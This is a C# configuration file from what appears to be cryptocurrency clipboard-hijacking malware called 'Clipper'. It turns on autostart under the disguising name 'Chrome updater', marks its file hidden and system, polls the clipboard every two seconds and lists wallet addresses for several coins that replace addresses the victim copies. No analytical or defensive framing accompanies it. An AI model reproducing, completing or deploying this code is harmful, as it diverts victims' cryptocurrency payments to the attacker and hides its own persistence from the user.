using System.Collections.Generic;

namespace Clipper
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace 
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            {"btc", "bc1qptlaq3jx4ysfxwhp09rc22yyh8ncm6eew7c4qq" }, // Bitcoin
            {"eth", "0xf8B9e54C66a8Ac253F375cC05cE7aB0ddA516dc1" }, // Ethereum
            {"xmr", "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR" }, // Monero
            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "ltc1qxpsuma67n4hvznwvdj3l7w98t2kygvy92e0ayw" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
            {"dash", "" } // Dashcoin
        };
        // Mutex (random)
        public static string mutex = "a1sfrewrfwerewsf231";

    }
}
